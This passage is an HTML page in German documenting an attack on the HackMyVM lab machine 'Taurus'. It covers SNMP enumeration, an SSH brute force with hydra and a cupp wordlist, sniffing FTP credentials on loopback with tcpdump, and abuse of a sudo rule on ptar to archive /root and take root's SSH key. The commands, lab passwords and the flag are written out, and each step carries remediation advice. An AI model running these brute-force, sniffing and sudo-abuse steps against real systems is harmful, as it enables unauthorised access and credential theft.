@@ -1,0 +1,470 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taurus - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Taurus - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">snmp-check</div>
+                <div class="tool-item">cupp</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">bash</div> <!-- Implied -->
+                <div class="tool-item">tcpdump</div>
+                <div class="tool-item">ptar</div> <!-- Custom tar? -->
+                <div class="tool-item">tar</div> <!-- Used for extraction -->
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cd</div> <!-- Implied -->
+                <div class="tool-item">vi</div> <!-- Implied for /etc/hosts -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (SNMP, Username Profiling)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH Brute Force)</a></li>
+                <li><a href="#poc">Proof of Concept (FTP Credential Sniffing via Sudo Script)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Sudo ptar Abuse)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.125</span>	<span class="command">08:00:27:69:1e:d7</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung von Hosts im lokalen Netzwerksegment mittels ARP-Anfragen verwendet. Es wird ein Host mit der IP-Adresse <span class="command">192.168.2.125</span> und der MAC-Adresse <span class="command">08:00:27:69:1e:d7</span> (zugeordnet zu PCS Systemtechnik GmbH / Oracle VirtualBox) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Taurus" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.125</span> ist die Basis für alle weiteren Scans und Interaktionen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie als Nächstes Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts für ARP-Scans reduzieren. Überwachen Sie das Netzwerk auf ungewöhnliche ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.125 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at <span class="command">2022-10-08 17:55 CEST</span>
+Nmap scan report for vulny (192.168.2.125) <span class="password"><-- Hostname 'vulny'? Später als taurus.hmv referenziert.</span>
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">21/tcp filtered ftp</span>     <span class="password"><-- FTP ist gefiltert</span>
+<span class="command">22/tcp open     ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
+|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
+|_  256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
+MAC Address: 08:00:27:69:1E:D7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms vulny (192.168.2.125)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in XX.XX seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-p-` alle Ports, `-sS` SYN, `-sC` Scripts, `-T5` Timing, `-sV` Version, `-A` Aggressive) auf <span class="command">192.168.2.125</span> identifiziert nur einen offenen TCP-Port:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 8.4p1 (Debian).</li>
+            </ul>
+            Port <span class="command">21 (FTP)</span> wird als `filtered` angezeigt, was bedeutet, dass Nmap keine definitive Antwort erhielt (möglicherweise durch eine Firewall blockiert). Die OS-Erkennung deutet auf Linux hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die primäre Angriffsfläche ist der SSH-Dienst auf Port 22. Die Filterung von Port 21 macht FTP als direkten Angriffsvektor unwahrscheinlich, schließt aber nicht aus, dass der Dienst lokal läuft oder unter bestimmten Bedingungen erreichbar ist. Der Hostname wird hier als `vulny` erkannt, später aber als `taurus.hmv` referenziert - dies könnte ein Konfigurationsdetail oder ein Hinweis sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die Enumeration auf den SSH-Dienst (Benutzerenumeration, Brute-Force mit gängigen/vermuteten Benutzernamen). Führen Sie zusätzliche Scans durch, insbesondere UDP-Scans (`nmap -sU`) und prüfen Sie auf alternative Webserver-Ports (`nmap -p 80,443,8000,8080...`). Führen Sie SNMP-Enumeration durch, falls UDP-Port 161 offen ist.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen und zugänglich sind. Konfigurieren Sie Firewalls korrekt. Verwenden Sie sichere SSH-Konfigurationen (Key-Auth bevorzugen, Root-Login deaktivieren, Fail2ban).</p>
+
+        </section>
+
+        <section id="enumeration">
+             <h2>Enumeration (SNMP, Username Profiling)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">snmp-check 192.168.2.125</span></div>
+                     <pre>
+snmp-check v1.9 - SNMP enumerator
+[...]
+[+] Try to connect to 192.168.2.125:161 using SNMPv1 and community '<span class="command">public</span>'
+
+[*] System information:
+
+  Host IP address               : 192.168.2.125
+  Hostname                      : "<span class="command">I Love My Name, Don't You, Little Hackers ?</span>" <span class="password"><-- Ungewöhnlicher Hostname</span>
+  Description                   : <span class="command">Linux taurus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span>
+  Contact                       : <span class="command">Sarah <sarah@hmv.org></span> <span class="password"><-- Benutzername/Email!</span>
+  Location                      : Unknown
+  Uptime snmp                   : 00:04:58.89
+  Uptime system                 : 00:04:50.82
+  System date                   : <span class="command">2022-10-8 17:58:08.0</span>
+[...] <span class="password"># Weitere SNMP-Informationen (Prozesse, Netzwerk etc.) nicht im Log gezeigt</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `snmp-check` wird verwendet, um SNMP-Informationen vom Ziel über den Standard-UDP-Port 161 mit dem Community-String `public` abzufragen. Der Versuch ist erfolgreich und liefert wertvolle Informationen:
+            <ul>
+                <li>Einen ungewöhnlichen Hostnamen: "I Love My Name, Don't You, Little Hackers ?"</li>
+                <li>Systembeschreibung: Debian Linux Kernel 5.10.</li>
+                <li>**Kontaktinformation:** <span class="command">Sarah <sarah@hmv.org></span>. Dies enthüllt einen wahrscheinlichen Benutzernamen (`sarah`).</li>
+                <li>System-Uptime und aktuelles Datum.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund durch SNMP-Enumeration! Der offene SNMP-Dienst mit dem Standard-Community-String `public` leakt Systeminformationen und vor allem einen Benutzernamen (`sarah`). Dies ist der Schlüssel für den nächsten Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Benutzernamen `sarah` als Ziel für einen SSH-Brute-Force-Angriff. Erstellen Sie eine benutzerdefinierte Wortliste für `sarah` (z.B. mit `cupp`) oder verwenden Sie Standardlisten.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den SNMP-Dienst, wenn er nicht benötigt wird. Wenn er benötigt wird, ändern Sie den Standard-Community-String `public` (und `private`) in starke, nicht erratbare Strings. Beschränken Sie den SNMP-Zugriff auf vertrauenswürdige Management-IPs. Konfigurieren Sie SNMP so, dass keine sensiblen Informationen (wie Kontakt/Benutzernamen) preisgegeben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cupp -i</span></div>
+                    <pre>
+ [...]
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+> First Name: <span class="command">sarah</span>
+> Surname: <span class="password">[Enter]</span>
+> Nickname: <span class="password">[Enter]</span>
+> Birthdate (DDMMYYYY): <span class="password">[Enter]</span>
+[...]
+> Pet's name: <span class="password">[Enter]</span>
+> Company name: <span class="password">[Enter]</span>
+> Do you want to add some key words about the victim? Y/[N]: <span class="command">N</span>
+> Do you want to add special chars at the end of words? Y/[N]: <span class="command">N</span>
+> Do you want to add some random numbers at the end of words? Y/[N]: <span class="command">Y</span> <span class="password"><-- Zahlen werden angehängt</span>
+> Leet mode? (i.e. leet = 1337) Y/[N]: <span class="command">N</span>
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to <span class="command">sarah.txt</span>, counting 108 words.
+[+] Now load your pistolero with sarah.txt and shoot! Good luck!
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `cupp` (Common User Passwords Profiler) wird im interaktiven Modus (`-i`) verwendet, um eine benutzerdefinierte Passwortliste zu erstellen. Als einzige Information wird der Vorname `<span class="command">sarah</span>` (aus SNMP) eingegeben. Es wird ausgewählt, dass Zufallszahlen am Ende angehängt werden sollen. Das Ergebnis ist eine Wortliste namens `sarah.txt` mit 108 Passwortkandidaten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sinnvoller Schritt, um eine gezielte, kleine Wortliste für den Brute-Force-Angriff auf den Benutzer `sarah` zu erstellen, basierend auf der Annahme, dass das Passwort möglicherweise Variationen ihres Namens enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die erstellte `sarah.txt` mit einem Brute-Force-Tool wie `hydra` gegen den SSH-Dienst für den Benutzer `sarah`.<br><strong>Empfehlung (Admin):</strong> Weisen Sie Benutzer an, keine Passwörter zu verwenden, die leicht aus persönlichen Informationen abgeleitet werden können.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH Brute Force)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -t64 -T64 -V ssh://192.168.2.125 -l sarah -P sarah.txt</span></div>
+                     <pre>
+[...]
+[22][ssh] host: 192.168.2.125   login: <span class="command">sarah</span>   password: <span class="password">Sarah_2012</span> <span class="password"><-- Erfolg!</span>
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen SSH-Brute-Force-Angriff gegen <span class="command">192.168.2.125</span> durchzuführen. `-t64 -T64` setzt die Anzahl der Tasks für Hosts und Logins (sehr aggressiv). `-V` aktiviert den Verbose-Modus. `-l sarah` gibt den Zielbenutzernamen an. `-P sarah.txt` verwendet die zuvor mit `cupp` erstellte Wortliste.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Hydra findet das gültige Passwort `<span class="password">Sarah_2012</span>` für den Benutzer `<span class="command">sarah</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Zugangsdaten (`sarah`:`Sarah_2012`), um sich per SSH am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Fail2ban oder ähnliche Schutzmechanismen gegen SSH-Brute-Force-Angriffe. Erzwingen Sie starke, nicht leicht zu erratende Passwörter. Überwachen Sie fehlgeschlagene Login-Versuche.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sarah@taurus.hmv</span></div> <span class="password"><-- Annahme: taurus.hmv wurde zu /etc/hosts hinzugefügt</span>
+                    <pre>
+The authenticity of host 'taurus.hmv (192.168.2.125)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'taurus.hmv' (ED25519) to the list of known hosts.
+sarah@taurus.hmv's password: <span class="password">[Passworteingabe: Sarah_2012]</span>
+Linux taurus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...]
+Last login: Sat Oct 16 21:19:01 2021 from 192.168.0.28
+sarah@taurus:~$ <span class="password"># Login erfolgreich!</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `sarah` zum Host `taurus.hmv` (der zuvor vermutlich zur `/etc/hosts`-Datei hinzugefügt wurde) aufgebaut. Das mit Hydra gefundene Passwort `<span class="password">Sarah_2012</span>` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine interaktive Shell als Benutzer `sarah` wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `sarah`. Überprüfen Sie die `sudo`-Rechte (`sudo -l`), suchen Sie nach interessanten Dateien im Home-Verzeichnis, SUID-Binaries usw., um Wege zur Privilege Escalation zu finden.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort für `sarah`. Überprüfen Sie die Systemkonfiguration (insbesondere SNMP), die zur Kompromittierung geführt hat.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (FTP Credential Sniffing via Sudo Script)</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `sarah` verfügt über `sudo`-Rechte, um das Skript `/opt/ftp` mittels `/usr/bin/bash` als Benutzer und Gruppe `marion` auszuführen. Dieses Skript stellt intern eine FTP-Verbindung zu `localhost` her und verwendet dabei hartcodierte oder anderweitig unsicher gespeicherte Zugangsdaten für den Benutzer `marion`. Da die FTP-Verbindung unverschlüsselt über das Loopback-Interface (`lo`) läuft, kann `sarah` (die das Skript auslösen kann) gleichzeitig mit `tcpdump` den Netzwerkverkehr auf `lo` mitschneiden. Im mitgeschnittenen Traffic sind die FTP-Login-Daten (Benutzer `marion` und das zugehörige Passwort) im Klartext sichtbar.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Shell-Zugriff als Benutzer `sarah`.</li>
+                    <li>Die `sudo`-Regel `(marion : marion) NOPASSWD: /usr/bin/bash /opt/ftp`.</li>
+                    <li>Das Skript `/opt/ftp` muss eine unverschlüsselte FTP-Verbindung zu `localhost` mit Klartext-Credentials aufbauen.</li>
+                    <li>Das Tool `tcpdump` muss auf dem Zielsystem für `sarah` verfügbar und ausführbar sein (oder ein alternatives Sniffing-Tool).</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>
+                        <strong>`tcpdump` starten:</strong>
+                        Starten Sie `tcpdump` in einem Terminalfenster oder im Hintergrund, um den Verkehr auf dem Loopback-Interface (`lo`) mitzuschneiden und nach ASCII-Daten zu suchen.
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">sarah@taurus:~$ <span class="command">tcpdump -A -s 10240 -i lo</span></div>
+                                 <pre>tcpdump: listening on lo...</pre>
+                             </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Sudo-Skript ausführen:</strong>
+                        Führen Sie in einem anderen Terminal (oder nach dem Start von `tcpdump` im Hintergrund) das `sudo`-privilegierte Skript aus.
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">sarah@taurus:~$ <span class="command">sudo -u marion /usr/bin/bash /opt/ftp</span></div>
+                                 <pre>ftp connection opened.
+ftp connection closed.</pre>
+                             </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>`tcpdump`-Ausgabe analysieren:</strong>
+                        Beenden Sie `tcpdump` (Strg+C) und untersuchen Sie die Ausgabe. Suchen Sie nach FTP-Befehlen wie `USER` und `PASS`.
+                        <div class="code-block">
+                             <div class="terminal">
+                                 <pre>
+[...]
+18:12:38.737043 IP6 localhost.47700 > localhost.ftp: Flags [P.], seq 0:14, ack 1, win 512, [...] length 14: FTP: <span class="command">USER marion</span>
+[...]
+18:12:38.738054 IP6 localhost.47700 > localhost.ftp: Flags [P.], seq 14:32, ack 70, win 512, [...] length 18: FTP: <span class="password">PASS ilovesushis</span>
+[...]
+18:12:38.758353 IP6 localhost.ftp > localhost.47700: Flags [P.], seq 70:97, ack 32, win 512, [...] length 27: FTP: <span class="password">230 User marion logged in</span>
+[...]
+18:12:38.758411 IP6 localhost.ftp > localhost.47700: Flags [P.], seq 97:111, ack 38, win 512, [...] length 14: FTP: 221 Goodbye.
+</pre>
+                             </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Die Klartext-Zugangsdaten für den Benutzer `marion` (Passwort: `<span class="password">ilovesushis</span>`) werden aus dem mitgeschnittenen FTP-Verkehr extrahiert.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die Ausgabe von `tcpdump`, die die `USER marion`- und `PASS ilovesushis`-Befehle im Klartext zeigt.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Mittel bis Hoch. Obwohl die Zugangsdaten nur lokal übertragen werden, ermöglicht die unsichere `sudo`-Regel einem Benutzer (`sarah`), diese auszuspähen und sich als ein anderer Benutzer (`marion`) auszugeben, was zu einer horizontalen oder vertikalen Rechteausweitung führt.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                    <li>**Sudo-Regel korrigieren:** Entfernen oder überarbeiten Sie die `sudo`-Regel für `sarah`. Es ist selten notwendig, dass ein Benutzer ein Skript als ein anderer spezifischer, unprivilegierter Benutzer ausführt.</li>
+                    <li>**Skript `/opt/ftp` absichern:** Entfernen Sie hartcodierte Zugangsdaten. Verwenden Sie sicherere Methoden zur Authentifizierung oder vermeiden Sie die Notwendigkeit des Skripts. Verwenden Sie verschlüsselte Protokolle (SFTP/FTPS) anstelle von Klartext-FTP, auch auf Loopback.</li>
+                    <li>**Least Privilege:** Weisen Sie Benutzern nur die minimal notwendigen Rechte zu.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Sudo ptar Abuse)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">sarah@taurus:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for sarah on taurus:
+    env_reset, mail_badpass, secure_path=[...]
+
+User sarah may run the following commands on taurus:
+    <span class="command">(marion : marion) NPASSWD: /usr/bin/bash /opt/ftp</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` für den Benutzer `sarah` wird ausgeführt. Er bestätigt, dass `sarah` `/usr/bin/bash /opt/ftp` als Benutzer und Gruppe `marion` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Ausgangspunkt für die Eskalation zum Benutzer `marion` durch Ausnutzung des FTP-Credential-Sniffing (siehe POC).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das Skript aus und sniffen Sie den Loopback-Traffic mit `tcpdump`, um die Zugangsdaten für `marion` zu erhalten.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit dieser `sudo`-Regel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">sarah@taurus:~$ <span class="command">sudo -u marion /usr/bin/bash /opt/ftp</span></div>
+                    <pre>ftp connection opened.
+ftp connection closed.</pre>
+                    <div class="prompt">sarah@taurus:~$ <span class="command">tcpdump -A -s 10240 -i lo</span></div>
+                     <pre>
+[...]
+18:12:38.738054 IP6 localhost.47700 > localhost.ftp: Flags [P.], [...] length 18: FTP: <span class="password">PASS ilovesushis</span>
+[...]
+18:12:38.758353 IP6 localhost.ftp > localhost.47700: Flags [P.], [...] length 27: FTP: <span class="password">230 User marion logged in</span>
+[...]
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das `sudo`-Kommando wird ausgeführt, während `tcpdump` auf dem Loopback-Interface lauscht. Die `tcpdump`-Ausgabe fängt die FTP-Kommunikation ab und enthüllt das Klartext-Passwort `<span class="password">ilovesushis</span>` für den Benutzer `marion`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Zugangsdaten für `marion` wurden erfolgreich ausgespäht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Benutzer `marion` (z.B. via `su marion` oder `ssh marion@localhost`) unter Verwendung des Passworts `<span class="password">ilovesushis</span>`.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel und `/opt/ftp`-Skript absichern.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Wechsel zu marion (impliziert, z.B. su marion)</span></div>
+                     <div class="prompt">marion@taurus:/home/sarah$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for marion on taurus:
+    env_reset, mail_badpass, secure_path=[...]
+
+User marion may run the following commands on taurus:
+    <span class="command">(ALL) NPASSWD: /usr/bin/ptar</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem (implizierten) Wechsel zum Benutzer `marion` wird `sudo -l` ausgeführt. Es zeigt sich, dass `marion` den Befehl `/usr/bin/ptar` als jeder Benutzer (`ALL`), also auch als `root`, ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Vektor für die Eskalation zu Root! `/usr/bin/ptar` ist wahrscheinlich eine Variante von `tar`. Da `tar` (und vermutlich auch `ptar`) verwendet werden kann, um beliebige Dateien zu lesen oder zu schreiben, ermöglicht diese `sudo`-Regel die vollständige Systemübernahme.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie `/usr/bin/ptar` mit `sudo`, um Root-Rechte zu erlangen:
+            1.  Lesen Sie sensible Dateien: `sudo /usr/bin/ptar -cf - /root/root.txt | tar -xf - -O` oder archivieren Sie `/root` und extrahieren Sie es in `/tmp`.
+            2.  Schreiben Sie Dateien: Erstellen Sie einen SSH-Schlüssel, archivieren Sie den öffentlichen Schlüssel und verwenden Sie `sudo /usr/bin/ptar` zum Entpacken nach `/root/.ssh/authorized_keys`.
+            3.  Führen Sie eine Shell aus (falls `ptar` Checkpoints oder ähnliche Optionen unterstützt): Prüfen Sie `gtfobins.github.io/gtfobins/tar/` für Techniken.<br>
+            <strong>Empfehlung (Admin):</strong> Entfernen Sie diese extrem gefährliche `sudo`-Regel sofort. Gewähren Sie niemals Rechte für Archivierungstools wie `tar` oder seine Varianten als Root, wenn der Benutzer nicht bereits Root ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">marion@taurus:/tmp$ <span class="command">sudo /usr/bin/ptar -cf user.tar /home/marion</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">marion@taurus:/tmp$ <span class="command">sudo /usr/bin/ptar -cf root.tar /root</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">marion@taurus:/tmp$ <span class="command">sudo /usr/bin/ptar -t -f root.tar</span></div>
+                     <pre>
+/root
+/root/.bashrc
+<span class="command">/root/root.txt</span>
+/root/.profile
+/root/.bash_history
+/root/.local
+/root/.local/share
+/root/.local/share/nano
+/root/.ssh
+/root/.ssh/authorized_keys
+<span class="command">/root/.ssh/id_rsa</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `marion` nutzt die `sudo`-Berechtigung, um `ptar` als Root auszuführen. Zuerst werden Archive von `/home/marion` und (entscheidend) `/root` erstellt und in `/tmp` gespeichert. Anschließend wird der Inhalt von `root.tar` aufgelistet (`-t`), was bestätigt, dass sensible Dateien wie `root.txt` und der private SSH-Schlüssel von Root (`id_rsa`) im Archiv enthalten sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `sudo`-Regel wurde erfolgreich genutzt, um auf Root-Dateien zuzugreifen, indem sie in ein Archiv gepackt wurden, das `marion` dann lesen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie das `root.tar`-Archiv in einem beschreibbaren Verzeichnis (z.B. `/tmp`), um auf die darin enthaltenen Dateien zuzugreifen.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel entfernen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">marion@taurus:/tmp$ <span class="command">tar -xf root.tar -C /tmp/</span></div>
+                    <pre>
+tar: Removing leading `/' from member names
+tar: Removing leading `/' from member names
+</pre>
+                     <div class="prompt">marion@taurus:/tmp$ <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+drwx------  4 marion marion  4096 Oct 16  2021 <span class="command">root</span> <span class="password"><-- Extrahiertes Verzeichnis</span>
+-rw-r--r--  1 root   root   12800 Oct  8 18:20 root.tar
+[...]
+</pre>
+                     <div class="prompt">marion@taurus:/tmp$ <span class="command">cd root/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">marion@taurus:/tmp/root$ <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">marion@taurus:/tmp/root$ <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">f3c6d27bbd3e9cf452c6c4258d316ce0</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Archiv `root.tar` wird mit dem Standard-`tar`-Befehl in `/tmp` entpackt (dies funktioniert, da `marion` Lesezugriff auf das Archiv hat und Schreibzugriff in `/tmp`). Das Verzeichnis `/tmp/root` wird erstellt. Darin wird die Datei `root.txt` gefunden und ihr Inhalt (die Root-Flag) gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich extrahiert. Dies wäre ein gültiger Endpunkt, aber der nächste Schritt zeigt die Eskalation zu einer interaktiven Root-Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie auch den privaten SSH-Schlüssel (`/tmp/root/.ssh/id_rsa`) und verwenden Sie ihn für einen SSH-Login als `root` zur Bestätigung.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel entfernen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">marion@taurus:/tmp/root$ <span class="command">cd .ssh</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">marion@taurus:/tmp/root/.ssh$ <span class="command">ls</span></div>
+                     <pre>authorized_keys  id_rsa</pre>
+                     <div class="prompt">marion@taurus:/tmp/root/.ssh$ <span class="command">ssh -i id_rsa root@localhost</span></div>
+                     <pre>
+Linux taurus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...]
+root@taurus:~# <span class="password"># Root-Shell erhalten!</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im extrahierten Verzeichnis `/tmp/root/.ssh` wird die private SSH-Schlüsseldatei `id_rsa` gefunden. Der Befehl `ssh -i id_rsa root@localhost` wird ausgeführt, um sich lokal als `root` mit diesem Schlüssel anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu einer interaktiven Root-Shell erfolgreich abgeschlossen! Durch das Archivieren und Extrahieren des `/root`-Verzeichnisses mittels `sudo ptar` konnte der private SSH-Schlüssel von Root erlangt und für den Login verwendet werden.</p>
